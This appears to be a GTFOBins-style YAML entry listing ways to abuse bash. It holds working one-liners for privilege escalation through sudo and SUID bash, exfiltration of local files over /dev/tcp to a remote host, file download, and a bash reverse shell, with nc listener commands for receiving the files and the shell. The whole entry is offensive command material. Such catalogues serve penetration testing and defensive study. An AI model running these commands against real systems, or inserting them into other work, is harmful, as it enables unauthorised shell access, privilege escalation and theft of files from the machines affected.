---
functions:
  exec-interactive:
    - code: bash
  sudo-enabled:
    - code: sudo bash
  suid-enabled:
    - code: ./bash -p
  upload:
    - description: Send local file in the body of an HTTP POST request. Run an HTTP service to collect the file on the other end.
      code: |
        RHOST=10.0.0.1
        RPORT=8000
        LFILE=file_to_send
        echo -e "POST / HTTP/0.9\n\n$(cat $LFILE)" > /dev/tcp/$RHOST/$RPORT
    - description: Send local file using a TCP connection. Run `nc -l -p 8000 > "where_to_save"` to collect the file on the other end.
      code: |
        RHOST=10.0.0.1
        RPORT=8000
        LFILE=file_to_send
        cat $LFILE > /dev/tcp/$RHOST/$RPORT
  download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        RHOST=10.0.0.1
        RPORT=8000
        LFILE=file_to_get
        (echo -e "GET /$LFILE HTTP/0.9\r\n\r\n" 1>&3 & cat 0<&3) 3<>/dev/tcp/$RHOST/$RPORT | (read i; while [ "$(echo $i | tr -d '\r')" != "" ]; do read i; done; cat) > $LFILE
    - description: Fetch remote file using a TCP connection. Run `nc -l -p 8000 < "file_to_send"` to send the file from the other end.
      code: |-
        RHOST=10.0.0.1
        RPORT=8000
        LFILE=file_to_get
        cat < /dev/tcp/$RHOST/$RPORT > $LFILE
  reverse-shell:
    - description: Run `nc -l -p 8000` to receive the shell on the other end.
      code: |
        RHOST=10.0.0.1
        RPORT=8000
        bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1
---
